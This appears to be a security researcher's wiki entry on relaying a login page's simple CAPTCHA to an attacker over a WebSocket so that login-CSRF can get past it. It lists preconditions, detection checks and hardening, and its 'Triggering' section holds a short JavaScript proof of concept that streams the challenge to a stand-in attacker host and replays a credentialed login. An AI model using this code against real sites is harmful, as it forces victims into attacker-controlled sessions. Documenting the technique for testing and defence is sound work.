---
title: CAPTCHA passthrough via attacker WebSocket
slug: captcha-passthrough-websocket
created_utc: 2026-05-14T00:00:00Z
updated_utc: 2026-05-14T00:00:00Z
tags: [technique/dom-xss, technique/login-csrf, technique/captcha-bypass]
inbound: []
---

# CAPTCHA passthrough via attacker WebSocket

## Pattern
Login-CSRF blocked by a simple image / text CAPTCHA. From the attacker page,
fetch the CAPTCHA challenge image, open a WebSocket to attacker-controlled
server, and stream the challenge to the attacker live. Attacker solves it
in their console; the answer is shipped back over the same WebSocket and
the CSRF login is replayed against the victim. ~10 lines of code suffice
for the simple-CAPTCHA case (Slonser's PoC). Conceptually identical to SMS
passthrough phishing.

## Preconditions
- Login-CSRF works in principle (no CSRF token).
- CAPTCHA is the only remaining defense, served as a fetchable challenge
  (image, simple math, text-only). reCAPTCHA / hCaptcha need a richer framework
  that proxies the sub-requests and frame messaging.

## Detection
- Login endpoint: is CAPTCHA the only bypass-blocker?
- Is the challenge fetchable from cross-origin (CORS / Same-site-strict)?

## Triggering
```js
const ws = new WebSocket("wss://attacker/ws");
// Pull CAPTCHA challenge image
const img = await (await fetch("/login/captcha")).blob();
ws.send(await img.arrayBuffer());

ws.onmessage = (e) => {
  // Attacker typed the solution
  fetch("/login", {
    method: "POST",
    credentials: "include",
    body: new URLSearchParams({user: "ATTACKER", pass: "...", captcha: e.data})
  });
};
```

## Bypasses / hardening
- reCAPTCHA-v3 / hCaptcha-invisible bind the token to browser-fingerprint +
  origin; relayed solutions are rejected. JG calls out wanting a framework
  for reCAPTCHA passthrough — "still an open research project".
- Rate-limit per-IP on the CAPTCHA challenge endpoint.

## Seen in the wild
- {date: 2025-06-26, source: CT Ep 128} — Slonser self-XSS chain demo.

## References
- Slonser blog — Make Self-XSS Great Again
- Critical Thinking Podcast Ep 128
- Related: [[credentialless-iframe-login-csrf]]
